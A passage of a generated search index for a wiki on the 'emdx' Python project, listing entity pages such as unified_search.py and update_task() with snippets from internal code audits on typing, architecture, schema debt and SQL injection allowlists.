<code>services/</code> alongside <code>claude_executor.py</code> and <code>unified_executor.py</code>.</p> </li> <li> <p>#6314 Delegate: analysis,architecture,active [13/15]   Section: Core Architecture Layers</p> </li> <li><code>unified_executor.py</code>: CLI execution abstraction for Claude/Cursor</li> <li><code>cascade_service.py</code>: pipeline facade for UI, monitoring completion</li> <li> <p><code>log_stream.py</code>: event-driven log str...</p> </li> <li> <p>#6309 Delegate: Analyze FUNCTION COMPLEXITY across emdx/ (exclude ui/ and tests/)   Section: Top 15 Worst Offenders (Ranked by Severity)</p> <p>...----|------|------|----------|-----------------| | 129.4 | 294 | 8 | <code>services/unified_executor.py:199</code> | <code>execute()</code> | Massive 300-line function with 8-level nesting, duplicated verbose/non-verbose streaming logic | | 120.5 | 145 | 11 | `utils/stream_json_par...</p> </li> <li> <p>#6111 EMDX Feature Sprint - 7 Parallel Builds   Section: Blocker Found &amp; Fixed</p> <p>...v before spawning. Applied to all 7 subprocess.Popen call sites across 4 files:</p> </li> <li><code>unified_executor.py</code> (2 calls \u2014 the main delegate path)</li> <li><code>claude_executor.py</code> (3 calls \u2014 background + sync execution)</li> <li><code>task_runner.py</code> (1 call \u2014 workflow task spawning)</li> <li> <p>`claude_wra...</p> </li> <li> <p>#6511 None Type Analysis [synthesis]   Section: File-by-File Summary</p> </li> <li>unified_executor.py: All 9 necessary</li> <li>cli_executor/base.py: All 4 necessary</li> <li>cli_executor/claude.py: All 6 necessary</li> <li>cli_executor/cursor.py: All 6 necessary</li> <li> <p>**cli_ex...</p> </li> <li> <p>#6385 Delegate: Analyze EMDX's actual usage patterns to determine what's rea [2/4]   Section: 6. Recommendations</p> <p>...4. tags.py - Clean tagging</p> </li> <li>prime.py/status.py - Claude integration</li> <li>unified_executor.py - Clean execution layer</li> <li>Documents/Tags/Tasks tables - Core schema</li> </ul>"},{"location":"entities/unifiedexecutorpy/#1-unified_executorpy","title":"1. <code>unified_executor.py</code>","text":"<p>The core execution engine that runs Claude CLI tasks with real-time log streaming \u2014 this powers the critical <code>emdx delegate</code> command that spawns parallel sub-agents.</p>"},{"location":"entities/unifiedexecutorpy/#5-executor-result-fields","title":"5. Executor Result Fields","text":"<p><code>unified_executor.py</code> has fields that are always assigned before access:</p>"},{"location":"entities/unifiedexecutorpy/#4-services-layer-services","title":"4. Services Layer (<code>services/</code>)","text":""},{"location":"entities/unifiedexecutorpy/#services-module","title":"Services Module","text":""},{"location":"entities/unifiedexecutorpy/#related-entities","title":"Related Entities","text":"<ul> <li><code>worst offenders by</code>dict[str, any]<code>count:</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.5)</li> <li><code>what's good</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.5)</li> <li><code>ui/keybindings/config.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.5)</li> <li><code>tool_call</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=5.1)</li> <li><code>duplicatestats</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=5.1)</li> <li><code>cli_executor/claude.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=5.1)</li> <li><code>ui/types.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=4.9)</li> <li><code>executionmetrics</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=4.7)</li> <li><code>connection.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=4.7)</li> <li><code>config/</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=4.7)</li> </ul>"},{"location":"entities/unifiedsearchpy/","title":"unified_search.py","text":"<p>Type: heading | Mentioned in: 11 documents | First seen: 2026-02-14</p>"},{"location":"entities/unifiedsearchpy/#documents-11","title":"Documents (11)","text":"<ul> <li>#6434 Any/None typing audit [4/5]   Section: Priority Recommendations </li> <li><code>unified_search.py</code> - <code>_embedding_service</code> attribute and <code>_convert_semantic_matches()</code> param</li> <li> <p><code>cli_executor/base.py</code> - <code>validate_environment()</code> return type (affects all executors) 7....</p> </li> <li> <p>#6611 Emoji alias removal: synthesis   Section: Actionable Items</p> <p>...e all 5 <code>expand_alias_string</code> calls</p> </li> <li>Update <code>auto_tagger.py</code>, <code>ask_service.py</code>, <code>unified_search.py</code> (1 change each)</li> <li>Rewrite <code>formatting.py:order_tags()</code> with text-based category sets</li> <li>Update <code>stale.py</code> TAG_WEIGHTS and <code>recipe.py</code> tag literal</li> <li> <p>Update CLAUDE....</p> </li> <li> <p>#6574 Delegate synthesis [synthesis]   Section: Key Findings</p> <p>...| | <code>unified_executor.py</code> | Claude CLI execution with real-time log streaming | | <code>unified_search.py</code> | Hybrid search orchestrator (FTS5 + semantic + tags) | | <code>document_service.py</code> | Clean API facade for all document operations |</p> </li> <li> <p>#6572 Delegate: List the 3 most important files in emdx/services/ and say on [2/2]   Section: 3 Most Important Files in emdx/services/</p> </li> <li> <p>#6508 Any Type Removal Analysis [synthesis]   Section: Files by Priority</p> <p>...| <code>activity_items.py</code> | 15 | 15 | | High | <code>cascade_view.py</code> | 12 | 12 | | High | <code>unified_search.py</code> | 5 | 5 | | High | <code>ask_service.py</code> | 6 | 6 | | Medium | <code>compact.py</code> | 7 | 5 | | Medium | <code>distill.py</code> | 5 | 4 | | Medium | <code>palette_presenter.py</code> | 5 | 5 | | Medi...</p> </li> <li> <p>#6490 Any Type Removal Analysis [4/5]   Section: Summary</p> <p>...services files:</p> </li> <li><code>emdx/services/ask_service.py</code> - 6 occurrences</li> <li><code>emdx/services/unified_search.py</code> - 4 occurrences</li> <li><code>emdx/services/file_watcher.py</code> - 2 occurrences</li> <li> <p><code>emdx/services/embedding_service.py</code> - 2 occurrences</p> </li> <li> <p>#6326 Delegate: Analyze emdx/services/ for architecture improvements. Focus  [2/10]   Section: Overlapping/Unclear Boundaries \u26a0\ufe0f</p> <p>...ns) | Service | Lines | Primary Purpose | |---------|-------|-----------------| | <code>unified_search.py:1-587</code> | 587 | FTS5 + tags + semantic + fuzzy search | | <code>embedding_service.py:1-371</code> | 371 | Vector embeddings + semantic search | | <code>similarity.py:1-584</code> | 584 | T...</p> </li> <li> <p>#6511 None Type Analysis [synthesis]   Section: File-by-File Summary</p> <p>...r.py**: All necessary</p> </li> <li>hybrid_search.py: 5 necessary, 1 borderline (keep)</li> <li>unified_search.py: All 7 necessary</li> <li>auto_tagger.py: All 8 necessary</li> <li>similarity.py: All 2 necessary</li> <li>ask_service.py: All 2 necessary</li> <li> <p>synthesis_service.py: All 2...</p> </li> <li> <p>#6497 None Type Analysis [6/7]   Section: Files with NO unnecessary <code>| None</code> annotations</p> <p>...py** \u2014 All <code>| None</code> used for optional parameters and nullable database fields</p> </li> <li>unified_search.py \u2014 All <code>| None</code> for optional search parameters and nullable datetime fields</li> <li>auto_tagger.py \u2014 All <code>| None</code> for optional init params</li> <li> <p>similarity.py \u2014 All...</p> </li> <li> <p>#6445 Test [2/2]   Section: Coverage Analysis by Area</p> <p>...nd_palette/*.py<code>| Command palette | |</code>ui/themes.py<code>| Theme system | |</code>services/unified_search.py<code>| Unified search service | |</code>utils/claude_wrapper.py<code>| Claude API wrapper | |</code>utils/retry.py` | Retry utilities |</p> </li> <li> <p>#6259 Delegate: Document #6230 (Delegate: Audit SECURITY DEBT in the emdx pr [17/37]   Section: Changes Made</p> </li> <li>unified_search.py: Embeddings availability check failures logged at debug level</li> </ul>"},{"location":"entities/unifiedsearchpy/#medium-priority","title":"Medium Priority","text":""},{"location":"entities/unifiedsearchpy/#2-unified_searchpy","title":"2. <code>unified_search.py</code>","text":"<p>The central search orchestrator that combines FTS5 full-text search, tag-based filtering, and semantic/embedding search into a single unified interface for the <code>emdx find</code> command.</p>"},{"location":"entities/unifiedsearchpy/#services-1-file","title":"Services (1 file)","text":""},{"location":"entities/unifiedsearchpy/#related-entities","title":"Related Entities","text":"<ul> <li><code>execution_service.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (4 shared docs, PMI=5.9)</li> <li><code>cli_executor/claude.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=5.9)</li> <li><code>file_watcher.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (4 shared docs, PMI=5.7)</li> <li><code>document_service.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (4 shared docs, PMI=5.7)</li> <li><code>watchdog.observer</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.7)</li> <li><code>hybrid_search.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.7)</li> <li><code>group_service.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.7)</li> <li><code>observer</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=5.5)</li> <li><code>ask_service.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (7 shared docs, PMI=5.4)</li> <li><code>tag_service.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.3)</li> </ul>"},{"location":"entities/unifiedsearchservice/","title":"unifiedsearchservice","text":"<p>Type: tech_term | Mentioned in: 9 documents | First seen: 2026-02-14</p>"},{"location":"entities/unifiedsearchservice/#documents-9","title":"Documents (9)","text":"<ul> <li>#6584 Delegate: Add missing all exports to emdx/services/cli_executor/__ [1/2]   Section: Symbols NOT Added (and why) <p>...tionMonitor`** \u2014 requires psutil, lazy-loaded in tests</p> </li> <li><code>HybridSearchService</code>, <code>UnifiedSearchService</code>, <code>SearchQuery</code> \u2014 only lazy-imported inside functions</li> <li><code>SynthesisService</code>, <code>DistillService</code> \u2014 only lazy-imported inside functions</li> <li> <p><code>FileWatcher</code> \u2014 requir...</p> </li> <li> <p>#6581 Delegate: Audit emdx/ui/ for methods with Any-typed parameters that co [2/3]   Section: 3. <code>search/search_presenter.py:82,87</code> \u2014 <code>_search_service: Any</code> / <code>search_service -&gt; Any</code></p> <p>This is a lazily-loaded <code>UnifiedSearchService</code>. Use <code>TYPE_CHECKING</code> guard.</p> </li> <li> <p>#6514 Any removal Phase 3: Protocols   Section: 4. Updated <code>emdx/ui/command_palette/palette_presenter.py</code></p> <ul> <li>Added <code>TYPE_CHECKING</code> import block with <code>UnifiedSearchService</code></li> </ul> </li> <li><code>_search_service: Any</code> to <code>_search_service: UnifiedSearchService | None</code></li> <li><code>search_service</code> property return type: <code>Any</code> to <code>UnifiedSearchService | None</code></li> <li> <p>`execut...</p> </li> <li> <p>#6487 Any Type Removal Analysis [3/5]   Section: 5. Line 69: <code>_search_service</code> attribute</p> <p>Recommended: ```python from emdx.services.unified_search import UnifiedSearchService</p> </li> <li> <p>#6436 Any/None typing audit [5/5]   Section: search/search_presenter.py</p> <p>...ny]]<code>| \u2705 Yes |</code>list[TagCountRow]<code>| |</code>_search_service<code>| L82 |</code>Any<code>| \u2705 Yes |</code>UnifiedSearchService | None<code>| |</code>_load_initial_data_sync<code>| L155 |</code>-&gt; tuple[Any, ...]` | \u2705 Yes | Explicit return type |</p> </li> <li> <p>#6417 Type System Audit: Replace Any/None with Concrete Types [4/4]   Section: 2. Search/Palette Presenters \u2014 <code>_search_service: Any</code> (4 occurrences)</p> <p>Problem: The <code>UnifiedSearchService</code> type is known but avoided due to lazy loading.</p> </li> <li> <p>#6409 Delegate: Research and design smarter context injection for emdx deleg [1/2]   Section: Current State</p> <p>Search infrastructure (unified_search.py):</p> </li> <li><code>UnifiedSearchService</code> already supports: FTS5, tag-based, semantic, fuzzy title search</li> <li><code>SearchQuery</code> dataclass with text, tags, semantic flags, date filters</li> <li> <p><code>SearchResult</code> with doc_id...</p> </li> <li> <p>#6327 Delegate: analysis,architecture [7/10]   Section: Areas for Improvement</p> </li> <li> <p><code>EmbeddingService</code>, <code>UnifiedSearchService</code>, <code>SimilarityService</code>, <code>AskService</code></p> </li> <li> <p>#6304 Delegate: Analyze NAMING &amp; CLARITY across emdx/ (exclude ui/ and tests [1/15]   Section: <code>*_service</code> vs <code>*Service</code> Class Names</p> <p>...e module | <code>cascade_service.py</code> | <code>services/cascade_service.py</code> | | Class-based | <code>UnifiedSearchService</code> | <code>services/unified_search.py:54</code> | | Class-based | <code>EmbeddingService</code> | <code>services/embedding_service.py</code> | | Module functions | <code>tag_service.py</code> | `services/tag_ser...</p> </li> </ul>"},{"location":"entities/unifiedsearchservice/#4-service-class-inconsistency","title":"4. Service Class Inconsistency","text":"<p>Only 4 classes follow <code>*Service</code> pattern:</p>"},{"location":"entities/unifiedsearchservice/#related-entities","title":"Related Entities","text":"<ul> <li><code>_search_service: any</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (4 shared docs, PMI=6.6)</li> <li><code>title_input: any</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.6)</li> <li><code>preview_mode_manager.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.6)</li> <li><code>paletteresultwidget.__init__</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.6)</li> <li><code>execute_selected(app: object)</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.6)</li> <li><code>execute_selected(app: any)</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.6)</li> <li><code>vim_line_numbers.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=6.1)</li> <li><code>tag_service</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.0)</li> <li><code>searchquery</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.0)</li> <li><code>search_service</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.0)</li> </ul>"},{"location":"entities/updatedat/","title":"updated_at","text":"<p>Type: tech_term | Mentioned in: 8 documents | First seen: 2026-02-13</p>"},{"location":"entities/updatedat/#documents-8","title":"Documents (8)","text":"<ul> <li> <p>#6719 Wiki Generation Quality Assessment &amp; Feedback Loops   Section: Source Content Hashing</p> <p>On generation: hash all source doc <code>updated_at</code> timestamps + content lengths \u2192 store as <code>source_fingerprint</code>. On check: recompute fingerprint. If different \u2192 article is stale.</p> </li> <li> <p>#6542 Delegate Enhancement Gameplans [5/5]   Section: 1. Add Query Function to <code>models/tasks.py</code></p> <p>...AND parent_task_id IS NULL             AND prompt IS NOT NULL             AND updated_at &gt; datetime('now', ?)             ORDER BY updated_at DESC             LIMIT ?         \"\"\", (f'-{hours} hours', limit))         return [cast(TaskDict, dict(row)) for...</p> </li> <li> <p>#6484 Any Type Removal Analysis [4/5]   Section: File: <code>emdx/services/unified_search.py</code></p> <p>Or more explicitly with TypedDict: ```python class FuzzyDoc(TypedDict):     id: int     title: str     project: str | None     created_at: str | None     updated_at: str | None</p> </li> <li> <p>#6472 EMDX Task System: Architecture, Data Model, and Integration   Section: Tasks Table (Core Entity)</p> <p>...umption | | Timestamps | | <code>created_at</code> | TIMESTAMP | now | Creation time | | <code>updated_at</code> | TIMESTAMP | now | Last update time | | <code>completed_at</code> | TIMESTAMP | NULL | Completion time (auto-set on done) | | Delegate Activity | | <code>prompt</code> | TEXT | NULL...</p> </li> <li> <p>#6410 Delegate: Research and design structured metadata for emdx save and de [2/2]   Section: Current State Analysis</p> <p>...ument fields:**</p> </li> <li><code>id</code>, <code>title</code>, <code>content</code>, <code>project</code> (core data)</li> <li><code>created_at</code>, <code>updated_at</code>, <code>accessed_at</code>, <code>access_count</code> (timestamps/tracking)</li> <li><code>is_deleted</code>, <code>deleted_at</code> (soft delete)</li> <li> <p><code>parent_id</code>, <code>relationship</code> (document hierarchy - supersedes/explo...</p> </li> <li> <p>#6404 Bug Fix PR Reviews [6/6]   Section: 4. ALLOWED_COLUMNS Whitelists - \u26a0\ufe0f INCOMPLETE</p> <p>Note: <code>current_step</code> exists in schema but is never used, so excluding it is fine. <code>completed_at</code> and <code>updated_at</code> are handled specially inside the function, so they don't need to be in the whitelist.</p> </li> <li> <p>#6182 Delegate: analysis,task-system [13/15]   Section: Database Schema</p> <p>...ble</p> </li> <li><code>project</code>: Project name</li> <li><code>current_step</code>: Resume checkpoint</li> <li> <p><code>created_at</code>, <code>updated_at</code>, <code>completed_at</code>: Timestamps</p> </li> <li> <p>#6168 Delegate: Analyze the emdx task system's data model and database schem [1/15]   Section: Task Fields</p> <p>...| Current step within task | | <code>created_at</code> | TIMESTAMP | now | Creation time | | <code>updated_at</code> | TIMESTAMP | now | Last update time | | <code>completed_at</code> | TIMESTAMP | NULL | Completion time (set when status=done) |</p> </li> </ul>"},{"location":"entities/updatedat/#related-entities","title":"Related Entities","text":"<ul> <li><code>task_deps table</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=6.7)</li> <li><code>update_task(id, **kwargs)</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.7)</li> <li><code>task_log table</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.7)</li> <li><code>task types</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.7)</li> <li><code>task granularity</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.7)</li> <li><code>status flow</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.7)</li> <li><code>services layer integration points</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.7)</li> <li><code>sequential pipeline</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.7)</li> <li><code>recovery</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.7)</li> <li><code>execution_type</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=6.3)</li> </ul>"},{"location":"entities/updateexecution/","title":"update_execution()","text":"<p>Type: tech_term | Mentioned in: 10 documents | First seen: 2026-02-14</p>"},{"location":"entities/updateexecution/#documents-10","title":"Documents (10)","text":"<ul> <li>#6872 Delegate: Document #6864 (Delegate synthesis [synthesis]):</li> </ul>"},{"location":"entities/updateexecution/#synthes-34","title":"Synthes [3/4]","text":"<p>Section: 5. <code>emdx/models/executions.py</code> \u2014 2 dead functions (test-only)</p> <p>...| | <code>update_execution_working_dir()</code> | 303-314 | None \u2014 superseded by generic <code>update_execution()</code> | <code>test_execution_system.py</code> only | | <code>cleanup_old_executions()</code> | 389-416 | None | <code>test_execution_system.py</code> only |</p> <ul> <li>#6708 Delegate: Analyze how running delegates are tracked in the database. R [3/4]   Section: What's Available for Running Delegates <p>...st_usd<code>,</code>tokens_used<code>,</code>input_tokens<code>,</code>output_tokens<code>\u2014 all written in a single</code>update_execution()` call after the process exits</p> </li> <li><code>completed_at</code>, <code>exit_code</code> \u2014 set by <code>update_execution_status()</code></li> <li> <p><code>output_text</code> \u2014 set on success</p> </li> <li> <p>#6509 Any Type Removal Analysis [synthesis]   Section: Common Themes</p> </li> <li> <p>#6433 Any/None typing audit [2/5]   Section: executions.py</p> <p>...-----|-------|--------------|----------------------| | Line 215 <code>**kwargs: Any</code> | <code>update_execution()</code> kwargs | \u2705 Yes | <code>ExecutionUpdateDict</code> TypedDict | | Line 345 return <code>dict[str, Any]</code> | <code>get_execution_stats()</code> | \u2705 Yes | <code>ExecutionStatsDict</code> TypedDict |</p> </li> <li> <p>#6418 Type System Audit: Replace Any/None with Concrete Types [3/4]   Section: emdx/commands/delegate.py</p> </li> <li>Location: Line 72</li> <li>Current Type: <code>**kwargs: Any</code></li> <li> <p>Actual Type: Should use specific keyword arguments matching <code>update_execution()</code> signature</p> </li> <li> <p>#6396 Delegate: DB Safety Fixes (Tasks #620, #624, #626, #629)   Section: Summary</p> <p>...update_task()`</p> </li> <li><code>executions.py</code>: Added <code>ALLOWED_EXECUTION_COLUMNS</code> frozenset for <code>update_execution()</code></li> <li> <p><code>groups.py</code>: Already had <code>allowed_fields</code> whitelist in <code>update_group()</code></p> </li> <li> <p>#6327 Delegate: analysis,architecture [7/10]   Section: Areas for Improvement</p> <p>...s raw SQL operations, not domain models:</p> </li> <li><code>executions.py</code>: <code>create_execution()</code>, <code>update_execution()</code>, SQL queries</li> <li><code>tags.py</code>: <code>get_tag()</code>, <code>create_tag()</code>, SQL queries</li> <li> <p><code>tasks.py</code>: <code>create_task()</code>, <code>update_task()</code>, SQL queries</p> </li> <li> <p>#6249 Migration/Schema Debt Fix Implementation [6/14]   Section: Changes Made</p> </li> <li>Added allowlist to <code>update_execution()</code> to prevent SQL injection</li> <li>Added security documentation comments explaining the dynamic SQL pattern</li> <li> <p>Documented allowlist rationale in <code>groups.py</code> <code>update_group()</code></p> </li> <li> <p>#6228 Delegate: Audit MIGRATION/SCHEMA DEBT in the emdx project: Check datab [6/14]   Section: 1. MEDIUM: Execution Dataclass Out of Sync with Schema**</p> <p>Impact: Functions that SELECT these columns will break if code tries to access them on the dataclass. The <code>update_execution()</code> function handles dynamic kwargs so writes work, but reads don't populate these fields.</p> </li> <li> <p>#6216 Delegate: Audit MIGRATION/SCHEMA DEBT in the emdx project: Check datab [6/14]   Section: MEDIUM Severity</p> <p>The <code>Execution</code> dataclass does NOT include these fields. While <code>update_execution()</code>  can write them, <code>get_execution()</code> and <code>get_recent_executions()</code> won't return them.</p> </li> </ul>"},{"location":"entities/updateexecution/#4-kwargs-for-update-functions-medium-priority","title":"4. <code>**kwargs</code> for Update Functions (Medium Priority)","text":"<p>Functions like <code>update_task()</code>, <code>update_execution()</code>, <code>update_group()</code> use <code>**kwargs: Any</code> but have explicit allowlists.</p>"},{"location":"entities/updateexecution/#40-_safe_update_executionexec_id-kwargs-any","title":"40. <code>_safe_update_execution(exec_id, **kwargs: Any)</code>","text":""},{"location":"entities/updateexecution/#4-security-improvements-finding-3-medium","title":"4. Security Improvements (Finding #3 - MEDIUM)","text":""},{"location":"entities/updateexecution/#related-entities","title":"Related Entities","text":"<ul> <li><code>idx_executions_heartbeat</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.4)</li> <li><code>task_executions.execution_type</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.8)</li> <li><code>missing index</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.8)</li> <li><code>create_execution()</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.8)</li> <li><code>cleanup_old_executions()</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.8)</li> <li><code>update_task()</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (5 shared docs, PMI=5.7)</li> <li><code>update_group()</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=5.7)</li> <li><code>unpack</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.4)</li> <li><code>anthropic.anthropic</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.4)</li> <li><code>list[semanticmatch]</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.1)</li> </ul>"},{"location":"entities/updatetask/","title":"update_task()","text":"<p>Type: tech_term | Mentioned in: 8 documents | First seen: 2026-02-13</p>"},{"location":"entities/updatetask/#documents-8","title":"Documents (8)","text":"<ul> <li> <p>#6509 Any Type Removal Analysis [synthesis]   Section: Common Themes</p> </li> <li> <p>#6433 Any/None typing audit [2/5]   Section: tasks.py</p> <p>...ams in <code>list_tasks()</code> | \u2705 Yes | <code>list[str \\| int]</code> | | Line 185 <code>**kwargs: Any</code> | <code>update_task()</code> kwargs | \u2705 Yes | See note below | | Line 262 <code>params: list[Any]</code> | SQL params in <code>get_ready_tasks()</code> | \u2705 Yes | <code>list[str \\| int]</code> | | Line 467 <code>raw: dict[str, Any]</code>...</p> </li> <li> <p>#6418 Type System Audit: Replace Any/None with Concrete Types [3/4]   Section: emdx/commands/delegate.py</p> </li> <li>Location: Line 62</li> <li>Current Type: <code>**kwargs: Any</code></li> <li> <p>Actual Type: Should use specific keyword arguments matching <code>update_task()</code> signature</p> </li> <li> <p>#6396 Delegate: DB Safety Fixes (Tasks #620, #624, #626, #629)   Section: Summary</p> <p>...Injection Prevention)</p> </li> <li><code>tasks.py</code>: Added <code>ALLOWED_UPDATE_COLUMNS</code> frozenset for <code>update_task()</code></li> <li><code>executions.py</code>: Added <code>ALLOWED_EXECUTION_COLUMNS</code> frozenset for <code>update_execution()</code></li> <li> <p><code>groups.py</code>: Already had <code>allowed_fields</code> whitelist in <code>update_group()</code></p> </li> <li> <p>#6379 Codebase Bug Audit 2026-02-15 [10/10]   Section: HIGH SEVERITY ISSUES (4)</p> </li> <li> <p>#6372 Codebase Bug Audit 2026-02-15 [4/10]   Section: Summary</p> <p>In <code>update_task()</code>, column names from <code>kwargs.keys()</code> are interpolated directly into SQL:</p> </li> </ul> <pre><code>sets.append(f\"{key} = ?\")\n</code></pre> <ul> <li>#6327 Delegate: analysis,architecture [7/10]   Section: Areas for Improvement <p>...tags.py<code>:</code>get_tag()<code>,</code>create_tag()`, SQL 